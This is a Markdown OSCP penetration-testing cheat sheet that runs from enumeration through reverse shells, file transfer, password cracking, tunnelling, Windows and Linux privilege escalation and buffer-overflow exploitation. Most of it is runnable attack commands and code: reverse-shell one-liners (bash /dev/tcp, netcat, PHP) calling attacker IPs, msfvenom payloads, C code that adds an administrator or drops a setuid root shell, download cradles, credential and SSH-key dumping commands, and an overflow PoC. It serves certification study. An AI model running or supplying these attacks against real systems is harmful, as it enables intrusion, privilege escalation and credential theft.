# OSCP Cheat Sheet

## Enumeration/Scanning
https://sushant747.gitbooks.io/total-oscp-guide/list_of_common_ports.html

### TCP Scan
`nmap -sC -sV -O [ip]`

`unicornscan [ip]:1-65535`


### UDP Scan
`nmap [ip] -sU`

`unicornscan -mU -v -I [ip]`


### FTP (21)
`nmap -p 21 [ip] --script=ftp-anon`

`nmap -p 21 [ip] --script=ftp-brute`

`nmap -p 21 [ip] --scipt=ftp*`


### SMTP (25)
`nmap –script smtp-commands,smtp-enum-users,smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764 -p 25 [ip]`

`telnet [ip] 25`


### HTTP/HTTPS (80/443)
`nikto -h [ip]`

`dirbuster`

`robots.txt`


#### Wordpress
`nmap -p 80,443 [ip] --script=wordpress*`


### Kerberos (88)
MS14-068

### Pop3 (110)
`telnet [ip] 110`

`USER [username]`

`PASS [password]`

`LIST`

`RETR`

`QUIT`


### RPCBind (111)
`rpcinfo -p [ip]`

`rpcbind -p [ip]`


### SMB/Samba (139, 455)
`nmap -p 139,445 [ip] --script=smb-enum*`

`nmap -p 139,445 [ip] --script=smb-os-discovery`

`nmap -p 139,445 [ip] --script=smb-vuln*`

`enum4linux -a [-u username] [-p password] [ip]`

`smbmap [-u username] [-p password] [ip]`

`smbclient -L \\\\[ip]\\[share]`

`nmblookup -A [ip]`

#### What we're looking for
- Misconfigurations in permissions of shares (Null sessions or read and/or write access)
- Sensitive information that can be levereged elsewhere (credentials or version number)

#### Resources

##### Spreadsheet Checklist
https://docs.google.com/spreadsheets/d/1F9wUdEJv22HdqhSn6hy-QVtS7eumgZWYYrD-OSi6JOc/edit#gid=2080645025

##### Gitlab Checklist
https://0xdf.gitlab.io/2018/12/02/pwk-notes-smb-enumeration-checklist-update1.html#checklist

##### Hacking Articles SMB
https://www.hackingarticles.in/a-little-guide-to-smb-enumeration/


### SNMP (161)
`snmpwalk -c public -v1 [ip]`

`snmpcheck -t [ip] -c public`

`onesixtyone -c names -i hosts`

`snmpenum -t [ip]`



## Exploitation
https://sushant747.gitbooks.io/total-oscp-guide/exploiting.html

### Shells

#### Msfvenom

##### Meterpreter Usage
`msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.101 LPORT=445 -f exe -o shell_reverse.exe`

`use exploit/multi/handler`

`set payload windows/meterpreter/reverse_tcp`


##### Non-staged Payload
`msfvenom -p windows/shell_reverse_tcp LHOST=196.168.0.101 LPORT=445 -f [exe/php/sh] -o shell_reverse_tcp.[ext]`

`msfvenom -p linux/x86/shell_reverse_tcp LHOST=196.168.0.101 LPORT=445 -f [exe/php/sh] -o shell_reverse_tcp.[ext]`


##### Staged Payload
`msfvenom -p windows/shell/reverse_tcp LHOST=196.168.0.101 LPORT=445 -f [format] -o staged_reverse_tcp.[ext]`

`msfvenom -p linux/x86/shell/reverse_tcp LHOST=196.168.0.101 LPORT=445 -f [format] -o staged_reverse_tcp.[ext]`


#### Bash
`0<&196;exec 196<>/dev/tcp/192.168.1.101/80; sh <&196 >&196 2>&196`

`bash -i >& /dev/tcp/10.0.0.1/8080 0>&1`


#### PHP
`php -r '$sock=fsockopen("ATTACKING-IP",80);exec("/bin/sh -i <&3 >&3 2>&3");'`


#### Netcat

##### Linux
Bind - `nc -vlp 5555 -e /bin/bash`

Reverse - `nc 192.168.1.101 5555 -e /bin/bash`

Without -e flag - `rm -f /tmp/p; mknod /tmp/p p && nc ATTACKING-IP 4444 0/tmp/p`

##### Windows
Bind - `nc.exe -nlvp 4444 -e cmd.exe`

Reverse - `nc.exe 192.168.1.101 443 -e cmd.exe`


#### OpenBSD
`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4242 >/tmp/f`
AU
2


### Editing Exploits
Common problems are incorrect payload or return address

### Compiling Windows Exploits
64-bit - `i686-w64-mingw32-gcc exploit.c -o exploit`

32-bit - `i686-w64-mingw32-gcc 40564.c -o 40564 -lws2_32`

## File Transfer

### tFTP
`mkdir /tftp`

`atftpd --daemon --port 69 /tftp`

### FTP
`apt-get update && apt-get install pure-ftpd`

`./setup-ftp.sh`

#### Non-Interactive Version(Windows)
```
echo open ip 21> ftp.txt
echo USER offsec>> ftp.txt
echo [password]>> ftp.txt
echo bin >> ftp.txt
echo [GET/get] bruh.txt >> ftp.txt
echo bye >> ftp.txt

ftp -v -n -s:nonInteractiveFtp.txt
```


### VBS (Windows)
```
echo strUrl = WScript.Arguments.Item(0) > wget.vbs
echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
echo Dim http,varByteArray,strData,strBuffer,lngCounter,fs,ts >> wget.vbs
echo Err.Clear >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
echo http.Open "GET",strURL,False >> wget.vbs
echo http.Send >> wget.vbs
echo varByteArray = http.ResponseBody >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
echo Set ts = fs.CreateTextFile(StrFile,True) >> wget.vbs
echo strData = "" >> wget.vbs
echo strBuffer = "" >> wget.vbs
echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1,1))) >> wget.vbs
echo Next >> wget.vbs
echo ts.Close >> wget.vbs
```

### PowerShell
```
echo $storageDir = $pwd > wget.ps1
echo $webclient = New-Object System.Net.WebClient >>wget.ps1
echo $url = "http://192.168.1.101/file.exe" >>wget.ps1
echo $file = "output-file.exe" >>wget.ps1
echo $webclient.DownloadFile($url,$file) >>wget.ps1

powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1
```

### Linux
````
wget
curl
````

### Debug
```
upx -9 nc.exe --> compresses file to under 64kb
wine exe2bat.exe nc.exe nc.txt
copy to windows machine with echo commands on remote shell
```



## Password Cracking

### crunch
`crunch 6 6 0123...(alphabet) -o crunch.txt`

### pw/fgdump

### Windows Credentials Editor
`wce.exe -w`

### cewl
`cewl www.bruh.com -m 6 -w cewl.txt`

### medusa (htaccess)
`medusa -h [ip] -u admin -P passfile.txt -M http -m`


### ncrack(rdp)
`ncrack -vv --user offsec -P passfile.txt rdp://[ip]`

### hydra(SNMP, SSH)
```
hydra -P passfile.txt -v [ip] snmp
hydra -l root -P passfile.txt [ip] ssh
```

### hash-identifier

### John
`john --wordlist=/path/to/wordlist [hash file]`

#### Windows
Use output of pw/fgdump/wce


#### Linux
Use /etc/passwd and /etc/shadow
`unshadow passwd shadow` >  john


## Tunneling and Port Forwarding

### Port Forwarding/Redirection
`apt-get install rinetd`

`nano /etc/rinetd.conf` - add bindaddress bindport connectaddress connectport (middle man)

configures machine to forward traffice from bindaddress and bindport to connect address and connectport


### SSH Tunneling

#### Local Port Forwarding

`ssh [middleip] -p [middleport] [locallistenport]:[connectaddress]:[connect port]`

we can now listen on port 8080 for incoming traffice from connect address on localhost


#### Remote Port Forwarding
opens up ports on victim machine that are closed off from attacking machine (say we want to rdp)
`ssh [attacking machine] -p [attacking port] -R [port to tunnel to on attacking machine]:127.0.0.1:[port service is running on]` now attacker just connects to localhost on their assigned port


#### Dyanmic Port Forwarding
Where we set up local machine to forward traffice to any remote destination through a proxy
`ssh -D [local proxy port] -p [remote port] [target ip]`






## Local Privilege Escalation

### Rescources
https://guif.re/windowseop

https://sushant747.gitbooks.io/total-oscp-guide/post_exploitation.html

https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite

https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Windows.pdf

https://www.fuzzysecurity.com/tutorials/16.html

https://gist.github.com/sckalath/8dacd032b65404ef7411

https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/

https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/

Exploit Suggester scripts(kernel)

### Windows

#### System info
```
# Basics
systeminfo
hostname

# Who am I?
whoami
echo %username%

# What users/localgroups are on the machine?
net users
net localgroups

# More info about a specific user. Check if user has privileges.
net user user1

# View Domain Groups
net group /domain

# View Members of Domain Group
net group /domain <Group Name>

# Firewall
netsh firewall show state
netsh firewall show config

# Network
ipconfig /all
route print
arp -A

# How well patched is the system?
wmic qfe get Caption,Description,HotFixID,InstalledOn

#What tasks are scheduled?
schtasks /query /fo LIST /v

#What Services are running?
net start
wmic service list brief
tasklist /SVC

```

#### Services(DLL, binpath, registry, exe)
`accesschk64.exe -wuvqc "user" *` searches for services that can be tampered with by those in user group
accesschk64.exe -uwcqv "user" *
`accesschk64.exe -wuvc [service]` - checks permissions on service 

##### Finding vulnerable services(binpath)
we're looking for services that have the SERVICE_CHANGE_CONFIG allowed for our user so that we can mess with the binpath(use resources to exploit)

```
sc query state= all | findstr "SERVICE_NAME:" >> Servicenames.txt
FOR /F %i in (Servicenames.txt) DO echo %i
type Servicenames.txt
FOR /F "tokens=2 delims= " %i in (Servicenames.txt) DO @echo %i >> services.txt
FOR /F "tokens=2 delims= " %i in (Servicenames.txt) DO cmd.exe /c C:\path\to\accesschk -wuvc %i
FOR /F %i in (services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> path.txt

#Even if we can't write to binpath directly, we may be able to write to the set binary
cat path.txt | cut -c30- Done in linux, then transfer new file back
FOR [/F] %i in (path.txt) DO icacls %i - if we can write to binary, we can replace it with payload

#include <stdlib.h>
int main ()
{
int i;
    i = system("net localgroup administrators theusername /add");
return 0;
}

i686-w64-mingw32-gcc windows-exp.c -lws2_32 -o exp.exe


```

##### Accesschk64
```
# When executing any of the sysinternals tools for the first time the user will be presented with a GUI
pop-up to accept the EULA. This is obviously a big problem, however we can add an extra command line flag
to automatically accept the EULA.

accesschk.exe /accepteula ... ... ...

# Find all weak folder permissions per drive.
accesschk64.exe -uwdqs Users c:\
accesschk64.exe -uwdqs "Authenticated Users" c:\

# Find all weak file permissions per drive.
accesschk64.exe -uwqs Users c:\*.*
accesschk64.exe -uwqs "Authenticated Users" c:\*.*
```
Example had you look for SERVICE_CHANGE_CONFIG permission for users to be writeable so we could change binpath

##### Unqouted Paths

`wmic service get name,pathname,startmode` - find unquoted file paths for services
`msfvenom -p windows/exec CMD='net user /add qoute qoute123' -f exe-service -o common.exe` - creates binary to run in unquoted path, name of binary must be in path for this to work. then restart service

##### Registry
use sagishahar and pentestblog to check if registry key for services is writeable


#### Autorun
We're looking for execeutables that are automaticaly executed on some event (logon tab for autorun). Hopefully one of these executables has had poor misconfigurations for permissionsC


#### Cleartext or b64 passwords

```
try other words too (pass, pw)
findstr /si password *.txt
findstr /si password *.xml
findstr /si password *.ini

#find in config files
dir /s *pass* == *cred* == *vnc* == *.config*

#find all paswords in all files
findstr /spin "password" *.*

#common files to find passwords in
type c:\sysprep.inf
type c:\sysprep\sysprep.xml
type c:\unattend.xml
type %WINDIR%\Panther\Unattend\Unattended.xml
type %WINDIR%\Panther\Unattended.xml
dir c:*vnc.ini /s /b
dir c:*ultravnc.ini /s /b
dir c:\ /s /b | findstr /si *vnc.ini

#Registry
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"
reg query HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4 /v password

#search in reg
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s

# VNC
reg query "HKCU\Software\ORL\WinVNC3\Password"

# Windows autologin
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"

# SNMP Paramters
reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"

# Putty
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"

#meterpreter
> post/windows/gather/credentials/gpp
> post/windows/gather/enum_unattend

```

#### Pass the hash
```
wce32.exe -w
wce64.exe -w
fgdump.exe
```

#### Services only avalailable from loopback
```
netstat -ano

Proto  Local address      Remote address     State        User  Inode  PID/Program name
    -----  -------------      --------------     -----        ----  -----  ----------------
    tcp    0.0.0.0:21         0.0.0.0:*          LISTEN       0     0      -
    tcp    0.0.0.0:5900       0.0.0.0:*          LISTEN       0     0      -
    tcp    0.0.0.0:6532       0.0.0.0:*          LISTEN       0     0      -
    tcp    192.168.1.9:139    0.0.0.0:*          LISTEN       0     0      -
    tcp    192.168.1.9:139    192.168.1.9:32874  TIME_WAIT    0     0      -
    tcp    192.168.1.9:445    192.168.1.9:40648  ESTABLISHED  0     0      -
    tcp    192.168.1.9:1166   192.168.1.9:139    TIME_WAIT    0     0      -
    tcp    192.168.1.9:27900  0.0.0.0:*          LISTEN       0     0      -
    tcp    127.0.0.1:445      127.0.0.1:1159     ESTABLISHED  0     0      -
    tcp    127.0.0.1:27900    0.0.0.0:*          LISTEN       0     0      -
    udp    0.0.0.0:135        0.0.0.0:*                       0     0      -
    udp    192.168.1.9:500    0.0.0.0:*                       0     0      -

we care about the ones that are LISTEN/LISTENING
If they weren't scanned earlier, they're only available from inside.
Use remote port forwarding to access it

# Port forward using plink
plink.exe -l root -pw mysecretpassword 192.168.0.101 -R 8080:127.0.0.1:8080

# Port forward using meterpreter
portfwd add -l <attacker port> -p <victim port> -r <victim ip>
portfwd add -l 3306 -p 3306 -r 192.168.1.101

Local 0.0.0.0 means anyone can connect to it

Local 127.0.0.1 only listenting for connection from this machine

Local 192.168.1.9 is only listening for connections from inside network

```


#### Scheduled Tasks
```
schtasks /query /fo LIST /v - put output in file to grep over
cat schtask.txt | grep "SYSTEM\|Task To Run" | grep -B 1 SYSTEM
check perms on the binaries listed
```


#### AlwaysInstallElevated
```
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

if both return 0x1 then they're vulnerable
```

#### Kernel Exploits
run exploitsuggester.py


#### Metasploit Modules
```
use exploit/windows/local/service_permissions

post/windows/gather/credentials/gpp

run post/windows/gather/credential_collector 

run post/multi/recon/local_exploit_suggester

run post/windows/gather/enum_shares

run post/windows/gather/enum_snmp

run post/windows/gather/enum_applications

run post/windows/gather/enum_logged_on_users

run post/windows/gather/checkvm
```


### Linux

#### System info
```
# What is distribution type?
cat /etc/issue
cat /etc/*-release
cat /etc/lsb-release      # Debian based
cat /etc/redhat-release   # Redhat based

# Kernel version?
cat /proc/version
uname -a
uname -mrs
rpm -q kernel
dmesg | grep Linux
ls /boot | grep vmlinuz-

# Environment Variables?
cat /etc/profile
cat /etc/bashrc
cat ~/.bash_profile
cat ~/.bashrc
cat ~/.bash_logout
env
set

# What services are running with what privileges?
ps aux
ps -ef
top
cat /etc/services
ps aux | grep root
ps -ef | grep root

# What applications are installed? What version? are they currently running?
ls -alh /usr/bin/
ls -alh /sbin/
dpkg -l
rpm -qa
ls -alh /var/cache/apt/archivesO
ls -alh /var/cache/yum/

# Any service settings misconfigured?
cat /etc/syslog.conf
cat /etc/chttp.conf
cat /etc/lighttpd.conf
cat /etc/cups/cupsd.conf
cat /etc/inetd.conf
cat /etc/apache2/apache2.conf
cat /etc/my.conf
cat /etc/httpd/conf/httpd.conf
cat /opt/lampp/etc/httpd.conf
ls -aRl /etc/ | awk '$1 ~ /^.*r.*/

# Jobs Scheduled?
crontab -l
ls -alh /var/spool/cron
ls -al /etc/ | grep cron
ls -al /etc/cron*
cat /etc/cron*
cat /etc/at.allow
cat /etc/at.deny
cat /etc/cron.allow
cat /etc/cron.deny
cat /etc/crontab
cat /etc/anacrontab
cat /var/spool/cron/crontabs/root

# Who am I? What can I do?
id
who
w
last
cat /etc/passwd | cut -d: -f1    # List of users
grep -v -E "^#" /etc/passwd | awk -F: '$3 == 0 { print $1}'   # List of super users
awk -F: '($3 == "0") {print}' /etc/passwd   # List of super users
cat /etc/sudoers
sudo -l

# Can I read/write sensitive files?
cat /etc/passwd
cat /etc/group
cat /etc/shadow
cat /etc/exports - known vuln for this
ls -alh /var/mail/

# Anything interesting in home directories?
ls -ahlR /root/
ls -ahlR /home/

# What has the user been doing?
cat ~/.bash_history
cat ~/.nano_history
cat ~/.atftp_history
cat ~/.mysql_history
cat ~/.php_history

# What user info can be found?
cat ~/.bashrc
cat ~/.profile
cat /var/mail/root
cat /var/spool/mail/root

# Private keys?
cat ~/.ssh/authorized_keys
cat ~/.ssh/identity.pub
cat ~/.ssh/identity
cat ~/.ssh/id_rsa.pub
cat ~/.ssh/id_rsa
cat ~/.ssh/id_dsa.pub
cat ~/.ssh/id_dsa
cat /etc/ssh/ssh_config
cat /etc/ssh/sshd_config
cat /etc/ssh/ssh_host_dsa_key.pub
cat /etc/ssh/ssh_host_dsa_key
cat /etc/ssh/ssh_host_rsa_key.pub
cat /etc/ssh/ssh_host_rsa_key
cat /etc/ssh/ssh_host_key.pub
cat /etc/ssh/ssh_host_key

# What does var have?
ls -alh /var/log
ls -alh /var/mail
ls -alh /var/spool
ls -alh /var/spool/lpd
ls -alh /var/lib/pgsql
ls -alh /var/lib/mysql
cat /var/lib/dhcp3/dhclient.leases

# settings and config files?
ls -alhR /var/www/
ls -alhR /srv/www/htdocs/
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/
ls -alhR /var/www/html/

# Log Files?
cat /etc/httpd/logs/access_log
cat /etc/httpd/logs/access.log
cat /etc/httpd/logs/error_log
cat /etc/httpd/logs/error.log
cat /var/log/apache2/access_log
cat /var/log/apache2/access.log
cat /var/log/apache2/error_log
cat /var/log/apache2/error.log
cat /var/log/apache/access_log
cat /var/log/apache/access.log
cat /var/log/auth.log
cat /var/log/chttp.log
cat /var/log/cups/error_log
cat /var/log/dpkg.log
cat /var/log/faillog
cat /var/log/httpd/access_log
cat /var/log/httpd/access.log
cat /var/log/httpd/error_log
cat /var/log/httpd/error.log
cat /var/log/lastlog
cat /var/log/lighttpd/access.log
cat /var/log/lighttpd/error.log
cat /var/log/lighttpd/lighttpd.access.log
cat /var/log/lighttpd/lighttpd.error.log
cat /var/log/messages
cat /var/log/secure
cat /var/log/syslog
cat /var/log/wtmp
cat /var/log/xferlog
cat /var/log/yum.log
cat /var/run/utmp
cat /var/webmin/miniserv.log
cat /var/www/logs/access_log
cat /var/www/logs/access.log
ls -alh /var/lib/dhcp3/
ls -alh /var/log/postgresql/
ls -alh /var/log/proftpd/
ls -alh /var/log/samba/

```

#### Scripts
LinEnum.sh

#### Programs running as root
```
ps aux
```

#### Passwords
```
# Grep hardcoded passwords

grep -i user [filename]
grep -i pass [filename]
grep -C 5 "password" [filename]
find . -name "*.php" -print0 | xargs -0 grep -i -n "var $password"

# weak password checks

username:username
username:username1
username:root
username:admin
username:qwerty
username:password

# Anything interesting the the mail?
/var/spool/mail

# LinEnum
./LinEnum.sh -t -k password

# Perhaps they're hidden in config files
cat /var/apache2/config.inc
cat /var/lib/mysql/mysql/user.MYD
cat /root/anaconda-ks.cfg
```

#### Loopback services

netstat -anlp
netstat -ano

#### Suid and Guid
There are binaries with suid permission which means that it is run as another user (root in our case). These binaries may be able to spawn a shell and therefore a root shell.
```
#Find SUID
find / -perm -u=s -type f 2>/dev/null

#Find GUID
find / -perm -g=s -type f 2>/dev/null

find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 6 -exec ls -ld {} \; 2>/dev/null
find / -perm -1000 -type d 2>/dev/null
find / -perm -g=s -type f 2>/dev/null

find / -perm -1000 -type d 2>/dev/null   # Sticky bit - Only the owner of the directory or the owner of a file can delete or rename here.
find / -perm -g=s -type f 2>/dev/null    # SGID (chmod 2000) - run as the group, not the user who started it.
find / -perm -u=s -type f 2>/dev/null    # SUID (chmod 4000) - run as the owner, not the user who started it.

find / -perm -g=s -o -perm -u=s -type f 2>/dev/null    # SGID or SUID
for i in `locate -r "bin$"`; do find $i \( -perm -4000 -o -perm -2000 \) -type f 2>/dev/null; done    # Looks in 'common' places: /bin, /sbin, /usr/bin, /usr/sbin, /usr/local/bin, /usr/local/sbin and any other *bin, for SGID or SUID (Quicker search)

# find starting at root (/), SGID or SUID, not Symbolic links, only 3 folders deep, list with more detail and hide any errors (e.g. permission denied)
find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \; 2>/dev/null

# Check if suss binary tries to access some other files that can be written to
strace /path/to/bin 2>&1 | grep -i E "open|access|no such file"

#If it can, we can create a malicous payload and save it in the directory it is trying to access that we can write to
#include <stdio.h>
#include <stdlib.h>

static void inject()__attribute__((constructor));

void inject(){

system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");

}

#compile with
gcc -shared -o /path/to/binary -fPIC /path/to/script

#them run binary again

#Enumerate versions of binaries as they may be vulnerable
dpkg -l | grep [binary]

nmap
vim
less
more
nano
cp
mv
find

```

#### Sudo
```
#what can I run as root?

sudo -l
#search for exploits involving programs that can be run as root
```

#### Perms
```
#Find files which can be invoked as root and replace them with your own binary

#World writable files directories
find / -writable -type d 2>/dev/null
find / -perm -222 -type d 2>/dev/null
find / -perm -o w -type d 2>/dev/null

# World executable folder
find / -perm -o x -type d 2>/dev/null

# World writable and executable folders
find / \( -perm -o w -perm -o x \) -type d 2>/dev/null
```

#### bad path
```
If . is in PATH environment variable, then any binary can be run as root
```

#### Cron
```
# We're looking for scheduled tasks being run as root that may try to access files that we can write or overwrite to
# Look at PATH set on crontab
# Also look for files that although we can't edit, may contain vulnerabilites such as wildcards

ls -alh /var/spool/cron
ls -al /etc/ | grep cron
ls -al /etc/cron*
cat /etc/cron*
cat /etc/at.allow
cat /etc/at.deny
cat /etc/cron.allow
cat /etc/cron.deny
cat /etc/crontab
cat /etc/anacrontab
cat /var/spool/cron/crontabs/root
```

#### Unmounted filesystems
```
#If we find other filesystems we need to restart the process on them

mount -l
cat /etc/fstab
```

#### NFS Share
```
# First check if the target machine has any NFS shares
showmount -e 192.168.1.101

# If it does, then mount it to you filesystem
mount 192.168.1.101:/ /tmp/
```


## Buffer Overflow

### Tips

- Restart the debugger with each test
- Use nano
- Bad characters in instructions and addresses
- Set breakpoints

### Replicating Crash

Use a PoC script to crash the program such as
```
#!/usr/bin/python
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

buffer = "A" * 2700
try:
    print "\nSending evil buffer..."
    s.connect(('192.168.1.101', 9999))
    data = s.recv(1024)
    s.send(buffer)
    print "\nDone!."
except:
    print "bruhbad"

```


### Finding Location of RA

`/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l [no of bytes]`

`/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l [no of bytes] -q [value of ra (no 0x)]`


### Bad Characters
Character is bad if it is not found in buffer or truncates the payload

```
badchars = "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
```


### Locating Space for Shellcode
Look where registers point to at crash. SLMail example conveniently points to point after ra whereas crossfire has registers pointing to locations without enough space or require some editing.


### Finding useful instructions

#### Finding opcode of instruction
`/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb`

#### IDB
`!mona modules`

- Find module with no DEP and ASLR (all except last column false)

`!mona find -s “\xff\xe4” -m slmfc.dll`

- jmp esp in SLMail case


#### EDB

- Plugns --> opcode searcher --> opcode search
- Use when program is crashed
- use bar on right to search for instructions equivalent to changing eip register
  - ExP --> EIP
- click on segment wich read and execute permissions
- click find

- crossfire case has you add 12 bytes to eax as first stage shellcode
```
add eax 12
jmp eax
```

### Generating Shellcode
`msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f python -e x86/shikata_ga_nai -b “\x00\xbr\xuh”`

`msfvenom -p linux/x86/shell_bind_tcp LPORT=4444 -f python -e x86/shikata_ga_nai -b “\x00\xbr\xuh”`


